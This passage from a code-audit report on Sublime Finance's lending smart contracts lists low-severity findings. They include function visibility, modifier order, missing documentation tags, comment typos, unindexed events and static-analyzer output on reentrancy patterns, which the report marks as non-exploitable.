[335](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L335))\n```solidity\n        IERC20(_borrowAsset).safeApprove(_strategy, _amount);\n```\n\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1189](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1189))\n```solidity\n    function getPrincipal(uint256 _id) public view override returns (uint256) {\n```\n\n### The `nonReentrant` `modifier` should occur before all other modifiers\nThis is a best-practice to protect against reentrancy in other modifiers\n\n1. File: contracts/PooledCreditLine/LenderPool.sol (line [256](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L256))\n```solidity\n    ) external onlyPooledCreditLine nonReentrant override {\n```\n2. File: contracts/PooledCreditLine/LenderPool.sol (line [355](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L355))\n```solidity\n    function borrowed(uint256 _id, uint256 _sharesBorrowed) external override onlyPooledCreditLine nonReentrant {\n```\n3. File: contracts/PooledCreditLine/LenderPool.sol (line [370](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L370))\n```solidity\n    ) external override onlyPooledCreditLine nonReentrant {\n```\n4. File: contracts/PooledCreditLine/LenderPool.sol (line [394](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L394))\n```solidity\n    function terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {\n```\n\n### NatSpec missing `@return`\n1. File: contracts/PooledCreditLine/LenderPool.sol (lines [577-579](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L577-L579))\n```solidity\n     * @param _lender lender whose share of prinipal is to be withdrawn\n     */\n    function calculatePrincipalWithdrawable(uint256 _id, address _lender) external returns (uint256) {\n```\n2. File: contracts/PooledCreditLine/LenderPool.sol (lines [770-772](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L770-L772))\n```solidity\n     * @param _lender address of the lender for which query is made\n     */\n    function getLenderInfo(uint256 _id, address _lender) external view returns (LenderInfo memory) {\n```\n3. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1075-1077](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1075-L1077))\n```solidity\n     * @param _id identifier for the pooled credit line\n     */\n    function liquidate(uint256 _id) external override nonReentrant onlyLenderPool returns (address, uint256) {\n```\n4. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1187-1189](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1187-L1189))\n```solidity\n     * @param _id identifier for the pooled credit line\n     */\n    function getPrincipal(uint256 _id) public view override returns (uint256) {\n```\n\n### Typos\n\n1. File: contracts/Verification/twitterVerifier.sol (line [81](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L81))\n```solidity\n    /// @param _name name of the verifier (used in domain seperator)\n```\nseperator\n\n2. File: contracts/PooledCreditLine/LenderPool.sol (line [48](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L48))\n```solidity\n    //-------------------------------- Global varibales start --------------------------------//\n```\nvaribales\n\n3. File: contracts/PooledCreditLine/LenderPool.sol (line [61](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L61))\n```solidity\n     * @param borrowerInterestSharesWithdrawn interest paid by borroower in shares, withdrawn by lender\n```\nborroower\n\n4. File: contracts/PooledCreditLine/LenderPool.sol (line [74](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L74))\n```solidity\n     * @param borrowLimit max tokens that was reqeuested by borrower\n```\nreqeuested\n\n5. File: contracts/PooledCreditLine/LenderPool.sol (line [143](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L143))\n```solidity\n     * @param id idenitifer for the pooled credit line\n```\nidenitifer\n\n6. File: contracts/PooledCreditLine/LenderPool.sol (line [156](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L156))\n```solidity\n     * @notice Emitted when liqudity provided by lender is withdrawn as pool is cancelled\n```\nliqudity\n\n7. File: contracts/PooledCreditLine/LenderPool.sol (line [166](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L166))\n```solidity\n     * @param shares shares withdrawn by lender from interest accured by yield as well as supplied by borrower\n```\naccured\n\n8. File: contracts/PooledCreditLine/LenderPool.sol (line [185](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L185))\n```solidity\n    //--------------------------- Globa var update events start ---------------------------//\n```\nGloba\n\n9. File: contracts/PooledCreditLine/LenderPool.sol (line [277](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L277))\n```solidity\n     * @dev lent amount is deposited to savings account only once borrow limit is reached or if start is callled\n```\ncallled\n\n10. File: contracts/PooledCreditLine/LenderPool.sol (line [392](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L392))\n```solidity\n     * @param _to address to which all the borrow tokens are transfered\n```\ntransfered\n\n11. File: contracts/PooledCreditLine/LenderPool.sol (line [577](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L577))\n```solidity\n     * @param _lender lender whose share of prinipal is to be withdrawn\n```\nprinipal\n\n12. File: contracts/PooledCreditLine/LenderPool.sol (line [606](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L606))\n```solidity\n     * @notice Function used to liquidate a pooleed credit line\n```\npooleed\n\n13. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [228](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L228))\n```solidity\n     * @notice emitted when threhsolds for one of the parameters is updated\n```\nthrehsolds\n\n14. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [350](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L350))\n```solidity\n     * @notice emitted when the pooled credit line is terminatd by owner\n```\nterminatd\n\n### Formatting\n1. File: contracts/PooledCreditLine/LenderPool.sol (line [321](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L321))\n```solidity\n       if(_totalLent.sub(_fee) < pooledCLConstants[_id].minBorrowAmount) {\n```\n`if(` -> `if (`\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: contracts/Verification/twitterVerifier.sol (line [70](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L70))\n```solidity\n    event SignValidityUpdated(uint256 signValidity);\n```\n2. File: contracts/PooledCreditLine/LenderPool.sol (line [147](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L147))\n```solidity\n    event Lend(uint256 indexed id, address indexed user, uint256 amount);\n```\n3. File: contracts/PooledCreditLine/LenderPool.sol (line [154](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L154))\n```solidity\n    event WithdrawLiquidity(uint256 indexed id, address indexed user, uint256 shares);\n```\n4. File: contracts/PooledCreditLine/LenderPool.sol (line [161](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L161))\n```solidity\n    event WithdrawLiquidityOnCancel(uint256 indexed id, address indexed user, uint256 amount);\n```\n5. File: contracts/PooledCreditLine/LenderPool.sol (line [168](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L168))\n```solidity\n    event InterestWithdrawn(uint256 indexed id, address indexed user, uint256 shares);\n```\n6. File: contracts/PooledCreditLine/LenderPool.sol (line [175](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L175))\n```solidity\n    event LiquidationWithdrawn(uint256 indexed id, address indexed user, uint256 collateralShare);\n```\n7. File: contracts/PooledCreditLine/LenderPool.sol (line [181](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L181))\n```solidity\n    event Liquidated(uint256 indexed id, uint256 collateralLiquidated);\n```\n8. File: contracts/PooledCreditLine/LenderPool.sol (line [191](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L191))\n```solidity\n    event StartFeeFractionUpdated(uint256 updatedStartFeeFraction);\n```\n9. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [233](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L233))\n```solidity\n    event LimitsUpdated(string indexed limitType, uint256 max, uint256 min);\n```\n10. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [261](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L261))\n```solidity\n    event ProtocolFeeFractionUpdated(uint256 updatedProtocolFee);\n```\n11. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [285](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L285))\n```solidity\n    event CollateralDeposited(uint256 indexed id, uint256 amount, address indexed strategy);\n```\n12. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [292](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L292))\n```solidity\n    event CollateralWithdrawn(uint256 indexed id, uint256 amount);\n```\n13. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [312](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L312))\n```solidity\n    event BorrowedFromPooledCreditLine(uint256 indexed id, uint256 borrowAmount);\n```\n14. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [319](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L319))\n```solidity\n    event PooledCreditLineAccepted(uint256 indexed id, uint256 amount);\n```\n15. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [327](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L327))\n```solidity\n    event PartialPooledCreditLineRepaid(uint256 indexed id, address indexed repayer, uint256 repayAmount);\n```\n16. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [335](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L335))\n```solidity\n    event CompletePooledCreditLineRepaid(uint256 indexed id, address indexed repayer, uint256 repayAmount);\n```\n\n### Non-exploitable reentrancies\nCode should follow the best-practice of the [Checks-Effects-Interactions](https://docs.soliditylang.org/en/v0.4.21/security-considerations.html#re-entrancy) pattern\n```\nReentrancy in TwitterVerifier.registerSelf(bool,uint8,bytes32,bytes32,string,string,uint256) (contracts/Verification/twitterVerifier.sol#115-148):\n\tExternal calls:\n\t- verification.registerMasterAddress(msg.sender,_isMasterLinked) (contracts/Verification/twitterVerifier.sol#143)\n\tState variables written after the call(s):\n\t- hashAddressMap[digest] = msg.sender (contracts/Verification/twitterVerifier.sol#146)\n\t- twitterIdMap[_twitterId] = msg.sender (contracts/Verification/twitterVerifier.sol#145)\n\t- userData[msg.sender] = UserStructData(_twitterId,_tweetId) (contracts/Verification/twitterVerifier.sol#144)\nReentrancy in TwitterVerifier.registerSelf(bool,uint8,bytes32,bytes32,string,string,uint256) (contracts/Verification/twitterVerifier.sol#115-148):\n\tExternal calls:\n\t- verification.registerMasterAddress(msg.sender,_isMasterLinked) (contracts/Verification/twitterVerifier.sol#143)\n\tEvent emitted after the call(s):\n\t- UserRegistered(msg.sender,_isMasterLinked,_twitterId) (contracts/Verification/twitterVerifier.sol#147)\nReentrancy in TwitterVerifier.unregisterSelf() (contracts/Verification/twitterVerifier.sol#158-165):\n\tExternal calls:\n\t- verification.unregisterMasterAddress(msg.sender,address(this)) (contracts/Verification/twitterVerifier.sol#163)\n\tEvent emitted after the call(s):\n\t- UserUnregistered(msg.sender) (contracts/Verification/twitterVerifier.sol#164)\nReentrancy in TwitterVerifier.unregisterUser(address) (contracts/Verification/twitterVerifier.sol#171-178):\n\tExternal calls:\n\t- verification.unregisterMasterAddress(_user,address(this)) (contracts/Verification/twitterVerifier.sol#176)\n\tEvent emitted after the call(s):\n\t- UserUnregistered(_user) (contracts/Verification/twitterVerifier.sol#177)\n```\n\n```\nReentrancy in LenderPool._accept(uint256,uint256) (contracts/PooledCreditLine/LenderPool.sol#332-343):\n\tExternal calls:\n\t- IERC20(_borrowAsset).safeApprove(_strategy,_amount) (contracts/PooledCreditLine/LenderPool.sol#335)\n\t- pooledCLVariables[_id].sharesHeld = SAVINGS_ACCOUNT.deposit(_borrowAsset,_strategy,address(this),_amount) (contracts/PooledCreditLine/LenderPool.sol#336)\n\t- POOLED_CREDIT_LINE.accept(_id,_amount) (contracts/PooledCreditLine/LenderPool.sol#338)\n\tState variables written after the call(s):\n\t- pooledCLConstants[_id].borrowLimit = _amount (contracts/PooledCreditLine/LenderPool.sol#340)\n\t- delete pooledCLConstants[_id].startTime (contracts/PooledCreditLine/LenderPool.sol#341)\n\t- delete pooledCLConstants[_id].minBorrowAmount (contracts/PooledCreditLine/LenderPool.sol#342)\nReentrancy in LenderPool._rebalanceInterestWithdrawn(uint256,uint256,address,address) (contracts/PooledCreditLine/LenderPool.sol#694-742):\n\tExternal calls:\n\t- _withdrawInterest(id,from) (contracts/PooledCreditLine/LenderPool.sol#701)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- _withdrawInterest(id,to) (contracts/PooledCreditLine/LenderPool.sol#702)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tState variables written after the call(s):\n\t- _withdrawInterest(id,to) (contracts/PooledCreditLine/LenderPool.sol#702)\n\t\t- pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#439)\n\t\t- pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares = pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#482-485)\n\t\t- pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#486-489)\n\t\t- pooledCLVariables[_id].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#490-492)\n\t\t- pooledCLVariables[_id].yieldInterestWithdrawnShares = pooledCLVariables[_id].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#493-495)\n\t- pooledCLVariables[id].lenders[from].borrowerInterestSharesWithdrawn = pooledCLVariables[id].lenders[from].borrowerInterestSharesWithdrawn.sub(borrowerInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#715-718)\n\t- pooledCLVariables[id].lenders[from].yieldInterestWithdrawnShares = pooledCLVariables[id].lenders[from].yieldInterestWithdrawnShares.sub(yieldInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#722-725)\n\t- pooledCLVariables[id].lenders[to].borrowerInterestSharesWithdrawn = pooledCLVariables[id].lenders[to].borrowerInterestSharesWithdrawn.add(borrowerInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#730-733)\n\t- pooledCLVariables[id].lenders[to].yieldInterestWithdrawnShares = pooledCLVariables[id].lenders[to].yieldInterestWithdrawnShares.add(yieldInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#736-739)\nReentrancy in LenderPool._withdrawInterest(uint256,address) (contracts/PooledCreditLine/LenderPool.sol#429-445):\n\tExternal calls:\n\t- (_interestToWithdraw,_interestSharesToWithdraw) = _calculateInterestToWithdraw(_id,_lender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#433-438)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tState variables written after the call(s):\n\t- pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#439)\nReentrancy in LenderPool._withdrawLiquidity(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#524-572):\n\tExternal calls:\n\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t- (_interestWithdrawable,_interestSharesWithdrawable) = _calculateInterestToWithdraw(_id,msg.sender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#555-560)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\tState variables written after the call(s):\n\t- pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesWithdrawable) (contracts/PooledCreditLine/LenderPool.sol#563)\nReentrancy in LenderPool._withdrawLiquidity(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#524-572):\n\tExternal calls:\n\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t- IERC20(_borrowAsset).safeTransfer(msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#546)\n\t- (_interestWithdrawable,_interestSharesWithdrawable) = _calculateInterestToWithdraw(_id,msg.sender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#555-560)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,msg.sender,_sharesToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#565)\n\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tState variables written after the call(s):\n\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t\t- _balances[id][account] = _balances[id][account].sub(amount,ERC1155: burn amount exceeds balance) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#304-307)\n\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t\t- pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#439)\n\t\t- pooledCLVariables[id].lenders[from].borrowerInterestSharesWithdrawn = pooledCLVariables[id].lenders[from].borrowerInterestSharesWithdrawn.sub(borrowerInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#715-718)\n\t\t- pooledCLVariables[id].lenders[from].yieldInterestWithdrawnShares = pooledCLVariables[id].lenders[from].yieldInterestWithdrawnShares.sub(yieldInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#722-725)\n\t\t- pooledCLVariables[id].lenders[to].borrowerInterestSharesWithdrawn = pooledCLVariables[id].lenders[to].borrowerInterestSharesWithdrawn.add(borrowerInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#730-733)\n\t\t- pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares = pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#482-485)\n\t\t- pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#486-489)\n\t\t- pooledCLVariables[_id].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#490-492)\n\t\t- pooledCLVariables[id].lenders[to].yieldInterestWithdrawnShares = pooledCLVariables[id].lenders[to].yieldInterestWithdrawnShares.add(yieldInterestOnTransferAmount) (contracts/PooledCreditLine/LenderPool.sol#736-739)\n\t\t- pooledCLVariables[_id].yieldInterestWithdrawnShares = pooledCLVariables[_id].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#493-495)\n\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t\t- totalSupply[id] = totalSupply[id].add(amount) (contracts/PooledCreditLine/LenderPool.sol#677)\n\t\t- totalSupply[id] = supply - amount (contracts/PooledCreditLine/LenderPool.sol#681)\nReentrancy in LenderPool.lend(uint256,uint256) (contracts/PooledCreditLine/LenderPool.sol#281-304):\n\tExternal calls:\n\t- IERC20(_borrowAsset).safeTransferFrom(msg.sender,address(this),_amountToLend) (contracts/PooledCreditLine/LenderPool.sol#295)\n\t- _mint(msg.sender,_id,_amountToLend,) (contracts/PooledCreditLine/LenderPool.sol#296)\n\t\t- IERC1155ReceiverUpgradeable(to).onERC1155Received(operator,from,id,amount,data) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#380-388)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tState variables written after the call(s):\n\t- _mint(msg.sender,_id,_amountToLend,) (contracts/PooledCreditLine/LenderPool.sol#296)\n\t\t- totalSupply[id] = totalSupply[id].add(amount) (contracts/PooledCreditLine/LenderPool.sol#677)\n\t\t- totalSupply[id] = supply - amount (contracts/PooledCreditLine/LenderPool.sol#681)\nReentrancy in LenderPool.start(uint256,address) (contracts/PooledCreditLine/LenderPool.sol#312-330):\n\tExternal calls:\n\t- POOLED_CREDIT_LINE.cancelRequestOnLowCollection(_id) (contracts/PooledCreditLine/LenderPool.sol#322)\n\tState variables written after the call(s):\n\t- delete pooledCLConstants[_id].startTime (contracts/PooledCreditLine/LenderPool.sol#323)\nReentrancy in LenderPool.terminate(uint256,address) (contracts/PooledCreditLine/LenderPool.sol#394-409):\n\tExternal calls:\n\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#400)\n\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,_to,_principalWithdrawable.add(_totalInterestInShares),false) (contracts/PooledCreditLine/LenderPool.sol#406)\n\tState variables written after the call(s):\n\t- delete pooledCLConstants[_id] (contracts/PooledCreditLine/LenderPool.sol#407)\n\t- delete pooledCLVariables[_id] (contracts/PooledCreditLine/LenderPool.sol#408)\nReentrancy in LenderPool._calculateInterestToWithdraw(uint256,address,address,address) (contracts/PooledCreditLine/LenderPool.sol#447-502):\n\tExternal calls:\n\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\tState variables written after the call(s):\n\t- pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares = pooledCLVariables[_id].lenders[_lender].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#482-485)\n\t- pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].lenders[_lender].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#486-489)\n\t- pooledCLVariables[_id].borrowerInterestSharesWithdrawn = pooledCLVariables[_id].borrowerInterestSharesWithdrawn.add(_borrowerInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#490-492)\n\t- pooledCLVariables[_id].yieldInterestWithdrawnShares = pooledCLVariables[_id].yieldInterestWithdrawnShares.add(_yieldInterestForLender) (contracts/PooledCreditLine/LenderPool.sol#493-495)\nReentrancy in LenderPool.liquidate(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#612-627):\n\tExternal calls:\n\t- (_collateralAsset,_collateralLiquidated) = POOLED_CREDIT_LINE.liquidate(_id) (contracts/PooledCreditLine/LenderPool.sol#617)\n\tState variables written after the call(s):\n\t- pooledCLConstants[_id].collateralAsset = _collateralAsset (contracts/PooledCreditLine/LenderPool.sol#618)\n\t- pooledCLVariables[_id].collateralHeld = _collateralLiquidated (contracts/PooledCreditLine/LenderPool.sol#619)\nReentrancy in 